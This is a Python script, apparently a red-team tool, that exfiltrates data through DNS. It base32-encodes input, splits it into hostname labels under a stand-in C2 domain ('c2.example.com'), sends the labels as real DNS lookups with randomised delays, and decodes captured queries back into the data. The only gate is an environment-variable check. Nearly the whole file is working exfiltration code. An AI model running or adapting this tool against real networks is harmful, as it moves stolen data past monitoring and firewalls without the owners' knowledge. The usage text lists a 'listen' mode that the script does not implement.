#!/usr/bin/env python3
"""
dns_tunnel.py - DNS tunneling encoder/decoder for data exfiltration over DNS queries.
Encodes data as DNS hostname queries to a controlled authoritative NS server.

Usage:
    python scripts/dns_tunnel.py --mode encode --data "secret message" --domain c2.example.com
    python scripts/dns_tunnel.py --mode decode --queries queries.txt
    python scripts/dns_tunnel.py --mode listen --port 53 --domain c2.example.com

Engagement proof: set ENGAGEMENT_PROOF env var.
"""
import argparse
import base64
import hashlib
import os
import random
import socket
import sys
import time

ENGAGEMENT_PROOF = os.environ.get("ENGAGEMENT_PROOF", "")
MAX_LABEL_LEN = 63  # DNS label max length
MAX_HOSTNAME_LEN = 253


def require_proof():
    if not ENGAGEMENT_PROOF:
        print("[!] Set ENGAGEMENT_PROOF"); sys.exit(1)


def encode_to_dns_queries(data: str, domain: str, chunk_size: int = 40) -> list:
    """Encode data into a series of DNS hostnames."""
    encoded = base64.b32encode(data.encode()).decode().lower().rstrip("=")
    chunks = [encoded[i:i+chunk_size] for i in range(0, len(encoded), chunk_size)]
    total = len(chunks)
    queries = []
    session_id = hashlib.md5(os.urandom(8)).hexdigest()[:8]
    for idx, chunk in enumerate(chunks):
        query = f"{session_id}.{idx:04d}.{total:04d}.{chunk}.{domain}"
        queries.append(query)
    return queries


def decode_from_queries(queries: list) -> str:
    """Decode DNS queries back to original data."""
    chunks = {}
    for q in queries:
        parts = q.split(".")
        if len(parts) < 5:
            continue
        try:
            session, idx, total, data_chunk = parts[0], int(parts[1]), int(parts[2]), parts[3]
            chunks[idx] = data_chunk
        except (ValueError, IndexError):
            continue
    if not chunks:
        return ""
    ordered = "".join(chunks[k] for k in sorted(chunks.keys()))
    # Restore base32 padding
    pad = (8 - len(ordered) % 8) % 8
    b32 = (ordered + "=" * pad).upper()
    try:
        return base64.b32decode(b32).decode()
    except Exception as e:
        return f"[decode error: {e}]"


def send_queries(queries: list, dns_server: str = "8.8.8.8", delay: float = 0.5):
    """Send DNS queries (exfiltrate via real DNS lookups)."""
    require_proof()
    for i, query in enumerate(queries):
        try:
            socket.getaddrinfo(query, None)
        except socket.gaierror:
            pass  # Expected - the C2 server captures the query
        print(f"[+] Query {i+1}/{len(queries)}: {query[:60]}...")
        time.sleep(delay + random.uniform(0, delay))


def main():
    p = argparse.ArgumentParser(description="DNS tunnel encoder/decoder (authorized use only)")
    p.add_argument("--mode", choices=["encode","decode","send"], required=True)
    p.add_argument("--data", help="Data to encode/send")
    p.add_argument("--domain", default="c2.example.com", help="C2 domain")
    p.add_argument("--queries", help="File with queries (for decode mode)")
    p.add_argument("--delay", type=float, default=0.3, help="Delay between queries (seconds)")
    args = p.parse_args()

    if args.mode == "encode":
        if not args.data: print("[-] --data required"); sys.exit(1)
        queries = encode_to_dns_queries(args.data, args.domain)
        print(f"[+] {len(queries)} DNS queries for '{args.data[:30]}...':")
        for q in queries:
            print(f"  {q}")

    elif args.mode == "decode":
        if not args.queries: print("[-] --queries file required"); sys.exit(1)
        with open(args.queries) as f:
            qs = [l.strip() for l in f if l.strip()]
        result = decode_from_queries(qs)
        print(f"[+] Decoded: {result}")

    elif args.mode == "send":
        require_proof()
        if not args.data: print("[-] --data required"); sys.exit(1)
        queries = encode_to_dns_queries(args.data, args.domain)
        send_queries(queries, delay=args.delay)


if __name__ == "__main__":
    main()
